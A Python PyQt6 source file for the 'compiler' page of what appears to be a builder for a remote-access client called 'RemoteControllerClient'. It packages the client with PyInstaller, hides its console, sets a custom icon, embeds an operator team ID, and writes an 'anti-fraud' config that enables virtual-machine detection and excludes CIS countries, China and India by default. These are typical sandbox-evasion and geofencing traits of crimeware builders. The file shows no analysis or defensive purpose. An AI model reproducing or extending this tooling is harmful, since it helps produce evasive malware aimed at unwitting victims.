import importlib.util
import subprocess
import sys
from dataclasses import dataclass
import json
from pathlib import Path
from typing import Optional

from PyQt6 import QtCore, QtGui, QtWidgets

from ...core.i18n import I18n
from ...core.logging import EventLogger
from ...core.settings import SettingsStore
from ..common import make_button


@dataclass
class BuildOptions:
    source_dir: Path
    entrypoint: Path
    output_name: str
    team_id: str
    antifraud_vm: bool
    antifraud_region: bool
    antifraud_countries: list[str]
    output_dir: Path
    icon_path: Optional[Path]
    mode: str
    console: str


class BuilderWorker(QtCore.QThread):
    log_line = QtCore.pyqtSignal(str)
    finished = QtCore.pyqtSignal(bool, str, str)

    def __init__(self, options: BuildOptions):
        super().__init__()
        self.options = options

    def run(self) -> None:
        if importlib.util.find_spec("PyInstaller") is None:
            self.log_line.emit("PyInstaller is not installed.")
            self.finished.emit(False, "", "missing")
            return

        cmd = [
            sys.executable,
            "-m",
            "PyInstaller",
            "--noconfirm",
            "--clean",
            "--name",
            self.options.output_name,
        ]
        cmd.append("--onefile" if self.options.mode == "onefile" else "--onedir")
        if self.options.console == "hide":
            cmd.append("--noconsole")
        if self.options.icon_path:
            cmd.extend(["--icon", str(self.options.icon_path)])
        cmd.extend(["--distpath", str(self.options.output_dir)])
        cmd.append(str(self.options.entrypoint))

        self.log_line.emit(" ".join(cmd))
        process = subprocess.Popen(
            cmd,
            cwd=str(self.options.source_dir),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        if process.stdout:
            for line in process.stdout:
                self.log_line.emit(line.rstrip())
        exit_code = process.wait()
        if exit_code == 0:
            self._persist_build_metadata()
            output = str(self.options.output_dir / f"{self.options.output_name}.exe")
            self.finished.emit(True, output, "")
        else:
            self.finished.emit(False, "", "failed")

    def _resolve_output_dir(self) -> Path | None:
        output_dir = self.options.output_dir
        if self.options.mode == "onedir":
            output_dir = output_dir / self.options.output_name
        try:
            output_dir.mkdir(parents=True, exist_ok=True)
        except OSError:
            self.log_line.emit("Failed to prepare the build directory.")
            return None
        return output_dir

    def _persist_build_metadata(self) -> None:
        output_dir = self._resolve_output_dir()
        if not output_dir:
            return
        self._persist_team_id_file(output_dir)
        self._persist_antifraud_config(output_dir)

    def _persist_team_id_file(self, output_dir: Path) -> None:
        team_id = (self.options.team_id or "").strip()
        team_file = output_dir / "rc_team_id.txt"
        if not team_id:
            try:
                if team_file.exists():
                    team_file.unlink()
                    self.log_line.emit(f"Removed {team_file}.")
            except OSError:
                self.log_line.emit("Failed to remove the team id file.")
            return
        try:
            team_file.write_text(team_id, encoding="utf-8")
            self.log_line.emit(f"Wrote team id to {team_file}.")
        except OSError:
            self.log_line.emit("Failed to write the team id file.")

    def _persist_antifraud_config(self, output_dir: Path) -> None:
        payload = {
            "vm_enabled": bool(self.options.antifraud_vm),
            "region_enabled": bool(self.options.antifraud_region),
            "countries": list(self.options.antifraud_countries),
        }
        config_file = output_dir / "rc_antifraud.json"
        try:
            config_file.write_text(json.dumps(payload, indent=2), encoding="utf-8")
            self.log_line.emit(f"Wrote anti-fraud config to {config_file}.")
        except OSError:
            self.log_line.emit("Failed to write the anti-fraud config file.")


class CompilerPage(QtWidgets.QWidget):
    def __init__(self, i18n: I18n, settings: SettingsStore, logger: EventLogger):
        super().__init__()
        self.i18n = i18n
        self.settings = settings
        self.logger = logger
        self.worker: Optional[BuilderWorker] = None
        self.region_actions: dict[str, QtGui.QAction] = {}

        layout = QtWidgets.QVBoxLayout(self)
        layout.setSpacing(16)

        header = QtWidgets.QVBoxLayout()
        self.title_label = QtWidgets.QLabel()
        self.title_label.setStyleSheet("font-size: 20px; font-weight: 700;")
        self.subtitle_label = QtWidgets.QLabel()
        self.subtitle_label.setObjectName("Muted")
        header.addWidget(self.title_label)
        header.addWidget(self.subtitle_label)
        layout.addLayout(header)

        form_card = QtWidgets.QFrame()
        form_card.setObjectName("Card")
        form_layout = QtWidgets.QGridLayout(form_card)
        form_layout.setHorizontalSpacing(16)
        form_layout.setVerticalSpacing(12)

        self.source_label = QtWidgets.QLabel()
        self.source_input = QtWidgets.QLineEdit()
        self.source_button = make_button("", "ghost")
        self.source_button.clicked.connect(self.pick_source_dir)

        self.entry_label = QtWidgets.QLabel()
        self.entry_input = QtWidgets.QLineEdit()
        self.entry_button = make_button("", "ghost")
        self.entry_button.clicked.connect(self.pick_entrypoint)

        self.output_name_label = QtWidgets.QLabel()
        self.output_name_input = QtWidgets.QLineEdit()

        self.antifraud_label = QtWidgets.QLabel()
        self.vm_check = QtWidgets.QCheckBox()
        self.region_check = QtWidgets.QCheckBox()
        self.region_button = make_button("", "ghost")
        self.region_menu = QtWidgets.QMenu(self.region_button)
        self.region_button.setMenu(self.region_menu)
        self.region_check.toggled.connect(self._update_region_visibility)

        self.output_dir_label = QtWidgets.QLabel()
        self.output_dir_input = QtWidgets.QLineEdit()
        self.output_dir_button = make_button("", "ghost")
        self.output_dir_button.clicked.connect(self.pick_output_dir)

        self.icon_label = QtWidgets.QLabel()
        self.icon_input = QtWidgets.QLineEdit()
        self.icon_button = make_button("", "ghost")
        self.icon_button.clicked.connect(self.pick_icon)

        self.mode_label = QtWidgets.QLabel()
        self.mode_combo = QtWidgets.QComboBox()
        self.mode_combo.addItem(self.i18n.t("compiler_mode_onefile"), "onefile")
        self.mode_combo.addItem(self.i18n.t("compiler_mode_onedir"), "onedir")

        self.console_check = QtWidgets.QCheckBox()

        form_layout.addWidget(self.source_label, 0, 0)
        form_layout.addWidget(self.source_input, 0, 1)
        form_layout.addWidget(self.source_button, 0, 2)
        form_layout.addWidget(self.entry_label, 1, 0)
        form_layout.addWidget(self.entry_input, 1, 1)
        form_layout.addWidget(self.entry_button, 1, 2)
        form_layout.addWidget(self.output_name_label, 2, 0)
        form_layout.addWidget(self.output_name_input, 2, 1, 1, 2)
        form_layout.addWidget(self.antifraud_label, 3, 0)
        antifraud_row = QtWidgets.QHBoxLayout()
        antifraud_row.setSpacing(10)
        antifraud_row.addWidget(self.vm_check)
        antifraud_row.addWidget(self.region_check)
        antifraud_row.addWidget(self.region_button)
        antifraud_row.addStretch()
        form_layout.addLayout(antifraud_row, 3, 1, 1, 2)
        form_layout.addWidget(self.console_check, 4, 1, 1, 2)
        form_layout.addWidget(self.output_dir_label, 5, 0)
        form_layout.addWidget(self.output_dir_input, 5, 1)
        form_layout.addWidget(self.output_dir_button, 5, 2)
        form_layout.addWidget(self.icon_label, 6, 0)
        form_layout.addWidget(self.icon_input, 6, 1)
        form_layout.addWidget(self.icon_button, 6, 2)
        form_layout.addWidget(self.mode_label, 7, 0)
        form_layout.addWidget(self.mode_combo, 7, 1)

        layout.addWidget(form_card)

        actions = QtWidgets.QHBoxLayout()
        self.build_button = make_button("", "primary")
        self.build_button.clicked.connect(self.start_build)
        self.clear_button = make_button("", "ghost")
        self.clear_button.clicked.connect(self.clear_log)
        self.status_label = QtWidgets.QLabel()
        self.status_label.setObjectName("Muted")
        actions.addWidget(self.build_button)
        actions.addWidget(self.clear_button)
        actions.addStretch()
        actions.addWidget(self.status_label)
        layout.addLayout(actions)

        log_card = QtWidgets.QFrame()
        log_card.setObjectName("Card")
        log_layout = QtWidgets.QVBoxLayout(log_card)
        self.log_output = QtWidgets.QPlainTextEdit()
        self.log_output.setReadOnly(True)
        log_layout.addWidget(self.log_output)
        layout.addWidget(log_card, 1)

        self.load_state()
        self.apply_translations()
        self._update_region_visibility(self.region_check.isChecked())

    def load_state(self) -> None:
        builder = self.settings.get("builder", {})
        self.source_input.setText(builder.get("source_dir", ""))
        self.entry_input.setText(builder.get("entrypoint", ""))
        self.output_name_input.setText(builder.get("output_name", "RemoteControllerClient"))
        antifraud = builder.get("antifraud", {})
        if not isinstance(antifraud, dict):
            antifraud = {}
        vm_enabled = antifraud.get("vm", True)
        region_enabled = antifraud.get("region", True)
        countries = antifraud.get("countries")
        if not isinstance(countries, list) or not countries:
            countries = self._default_antifraud_countries()
        self.vm_check.setChecked(bool(vm_enabled))
        self.region_check.setChecked(bool(region_enabled))
        self._build_region_menu()
        self._set_selected_countries(countries)
        self.output_dir_input.setText(builder.get("output_dir", ""))
        self.icon_input.setText(builder.get("icon_path", ""))
        mode = builder.get("mode", "onefile")
        self.mode_combo.setCurrentIndex(0 if mode == "onefile" else 1)
        console = builder.get("console", "hide")
        self.console_check.setChecked(console == "show")

    def apply_translations(self) -> None:
        self.title_label.setText(self.i18n.t("compiler_title"))
        self.subtitle_label.setText(self.i18n.t("compiler_subtitle"))
        self.source_label.setText(self.i18n.t("compiler_source"))
        self.entry_label.setText(self.i18n.t("compiler_entry"))
        self.output_name_label.setText(self.i18n.t("compiler_output_name"))
        self.antifraud_label.setText(self.i18n.t("compiler_antifraud_title"))
        self.vm_check.setText(self.i18n.t("compiler_antifraud_vm"))
        self.region_check.setText(self.i18n.t("compiler_antifraud_region"))
        self.region_button.setText(self.i18n.t("compiler_regions"))
        self.output_dir_label.setText(self.i18n.t("compiler_output_dir"))
        self.icon_label.setText(self.i18n.t("compiler_icon"))
        self.mode_label.setText(self.i18n.t("compiler_mode"))
        self.console_check.setText(self.i18n.t("compiler_console_show"))
        self.source_button.setText(self.i18n.t("compiler_browse"))
        self.entry_button.setText(self.i18n.t("compiler_browse"))
        self.output_dir_button.setText(self.i18n.t("compiler_browse"))
        self.icon_button.setText(self.i18n.t("compiler_browse"))
        self.build_button.setText(self.i18n.t("compiler_build"))
        self.clear_button.setText(self.i18n.t("compiler_clear"))
        self.status_label.setText(self.i18n.t("compiler_status_idle"))
        self.mode_combo.setItemText(0, self.i18n.t("compiler_mode_onefile"))
        self.mode_combo.setItemText(1, self.i18n.t("compiler_mode_onedir"))
        if self.log_output.toPlainText().strip() == "":
            self.log_output.setPlaceholderText(self.i18n.t("compiler_log_placeholder"))
        self._build_region_menu()

    def pick_source_dir(self) -> None:
        path = QtWidgets.QFileDialog.getExistingDirectory(self, self.i18n.t("compiler_source"))
        if path:
            self.source_input.setText(path)
            guessed = self.guess_entrypoint(Path(path))
            if guessed and not self.entry_input.text().strip():
                self.entry_input.setText(str(guessed))

    def pick_entrypoint(self) -> None:
        path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self, self.i18n.t("compiler_entry"), filter="Python Files (*.py)"
        )
        if path:
            self.entry_input.setText(path)

    def pick_output_dir(self) -> None:
        path = QtWidgets.QFileDialog.getExistingDirectory(self, self.i18n.t("compiler_output_dir"))
        if path:
            self.output_dir_input.setText(path)

    def pick_icon(self) -> None:
        path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self, self.i18n.t("compiler_icon"), filter="Icon Files (*.ico)"
        )
        if path:
            self.icon_input.setText(path)

    def guess_entrypoint(self, source_dir: Path) -> Optional[Path]:
        candidates = ["client.py", "main.py", "app.py", "remote_client/main.py"]
        for candidate in candidates:
            candidate_path = source_dir / candidate
            if candidate_path.exists():
                return candidate_path
        return None

    def start_build(self) -> None:
        source_dir = Path(self.source_input.text().strip())
        entrypoint = Path(self.entry_input.text().strip())
        output_name = self.output_name_input.text().strip()
        team_id = str(self.settings.get("operator_team_id", "") or "").strip()
        antifraud_vm = self.vm_check.isChecked()
        antifraud_region = self.region_check.isChecked()
        antifraud_countries = self._selected_countries()
        output_dir_text = self.output_dir_input.text().strip() or str(source_dir / "dist")
        output_dir = Path(output_dir_text)
        icon_path = Path(self.icon_input.text().strip()) if self.icon_input.text().strip() else None
        mode = self.mode_combo.currentData()
        console = "show" if self.console_check.isChecked() else "hide"

        if not source_dir.exists() or not entrypoint.exists():
            self.log_output.appendPlainText(self.i18n.t("log_build_failed"))
            self.status_label.setText(self.i18n.t("compiler_status_failed"))
            return

        options = BuildOptions(
            source_dir=source_dir,
            entrypoint=entrypoint,
            output_name=output_name or "RemoteControllerClient",
            team_id=team_id,
            antifraud_vm=antifraud_vm,
            antifraud_region=antifraud_region,
            antifraud_countries=antifraud_countries,
            output_dir=output_dir,
            icon_path=icon_path,
            mode=mode,
            console=console,
        )
        self.persist_builder_state(options)
        self.status_label.setText(self.i18n.t("compiler_status_building"))
        self.build_button.setEnabled(False)
        self.log_output.clear()
        self.logger.log("log_build_start", entry=entrypoint.name)

        self.worker = BuilderWorker(options)
        self.worker.log_line.connect(self.log_output.appendPlainText)
        self.worker.finished.connect(self.finish_build)
        self.worker.start()

    def finish_build(self, success: bool, output: str, reason: str) -> None:
        self.build_button.setEnabled(True)
        if success:
            self.status_label.setText(self.i18n.t("compiler_status_done"))
            self.logger.log("log_build_done", output=output)
        else:
            if reason == "missing":
                self.log_output.appendPlainText(self.i18n.t("log_build_missing"))
            self.status_label.setText(self.i18n.t("compiler_status_failed"))
            self.logger.log("log_build_failed")

    def clear_log(self) -> None:
        self.log_output.clear()
        self.status_label.setText(self.i18n.t("compiler_status_idle"))

    def _update_region_visibility(self, enabled: bool) -> None:
        self.region_button.setVisible(enabled)

    def _default_antifraud_countries(self) -> list[str]:
        return [
            "AM",
            "AZ",
            "BY",
            "GE",
            "KZ",
            "KG",
            "MD",
            "RU",
            "TJ",
            "TM",
            "UA",
            "UZ",
            "CN",
            "IN",
        ]

    def _country_groups(self) -> list[tuple[str, list[tuple[str, str]]]]:
        return [
            (
                "compiler_regions_cis",
                [
                    ("AM", "country_am"),
                    ("AZ", "country_az"),
                    ("BY", "country_by"),
                    ("GE", "country_ge"),
                    ("KZ", "country_kz"),
                    ("KG", "country_kg"),
                    ("MD", "country_md"),
                    ("RU", "country_ru"),
                    ("TJ", "country_tj"),
                    ("TM", "country_tm"),
                    ("UA", "country_ua"),
                    ("UZ", "country_uz"),
                ],
            ),
            ("compiler_regions_china", [("CN", "country_cn")]),
            ("compiler_regions_india", [("IN", "country_in")]),
        ]

    def _build_region_menu(self) -> None:
        selected = self._selected_countries()
        self.region_menu.clear()
        self.region_actions = {}
        for section_key, entries in self._country_groups():
            self.region_menu.addSection(self.i18n.t(section_key))
            for code, label_key in entries:
                action = QtGui.QAction(self.i18n.t(label_key), self.region_menu)
                action.setCheckable(True)
                action.setChecked(code in selected)
                action.toggled.connect(self._update_regions_state)
                self.region_menu.addAction(action)
                self.region_actions[code] = action

    def _set_selected_countries(self, countries: list[str]) -> None:
        selected = {code.upper() for code in countries if code}
        if not self.region_actions:
            self._build_region_menu()
        for code, action in self.region_actions.items():
            action.setChecked(code in selected)

    def _selected_countries(self) -> list[str]:
        if not self.region_actions:
            return self._default_antifraud_countries()
        return [code for code, action in self.region_actions.items() if action.isChecked()]

    def _update_regions_state(self) -> None:
        if not self.region_check.isChecked():
            return
        if not self._selected_countries():
            self._set_selected_countries(self._default_antifraud_countries())

    def persist_builder_state(self, options: BuildOptions) -> None:
        self.settings.set(
            "builder",
            {
                "source_dir": str(options.source_dir),
                "entrypoint": str(options.entrypoint),
                "output_name": options.output_name,
                "antifraud": {
                    "vm": options.antifraud_vm,
                    "region": options.antifraud_region,
                    "countries": list(options.antifraud_countries),
                },
                "output_dir": str(options.output_dir),
                "icon_path": str(options.icon_path) if options.icon_path else "",
                "mode": options.mode,
                "console": options.console,
            },
        )
        self.settings.save()
